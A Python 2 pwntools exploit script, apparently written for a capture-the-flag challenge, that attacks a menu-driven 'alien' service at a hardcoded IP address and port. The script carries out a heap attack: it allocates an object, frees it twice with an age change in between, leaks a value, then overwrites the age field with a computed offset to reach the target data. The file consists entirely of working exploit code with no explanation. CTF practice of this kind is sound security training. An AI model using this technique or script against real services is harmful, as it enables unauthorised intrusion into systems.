import pwn

class Exploit:
    def __init__(self, addr, port, debug):
        if debug == True:
            pwn.context.log_level = 'DEBUG'
        self.handle = pwn.remote(addr, port)

    def recv_logo(self):
        self.handle.readuntil('\n'*3)

    def recv_menu(self):
        self.handle.readuntil('6):\n')

    def add_alien(self):
        self.recv_menu()
        self.handle.writeline('2')
        self.handle.readline()
        self.handle.readline()

    def del_alien(self, alien):
        self.recv_menu()
        self.handle.writeline('3')
        self.handle.readline()
        self.handle.writeline('%d' % alien)
        self.handle.readline()

    def observe(self, alien):
        self.recv_menu()
        self.handle.writeline('4')
        self.handle.readline()
        self.handle.writeline('%d' % alien)
        self.handle.readline()
        print self.handle.readline()

    def setage(self, age):
        self.recv_menu()
        self.handle.writeline('5')
        self.handle.readline()
        self.handle.writeline('%d' % age)

    def showage(self):
        self.recv_menu()
        self.handle.writeline('6')
        self.handle.readuntil('age: ')
        return int(self.handle.readline(keepends=False))

    def exploit(self):
        self.recv_logo()
        self.add_alien()
        self.del_alien(0)
        self.setage(0)
        self.del_alien(0)
        self.add_alien()
        self.setage(((self.showage() >> 32) - 118) << 32)
        self.observe(0)
        print self.handle.readline()
        self.recv_menu()

e = Exploit("143.248.38.212", 40009, False)
e.exploit()
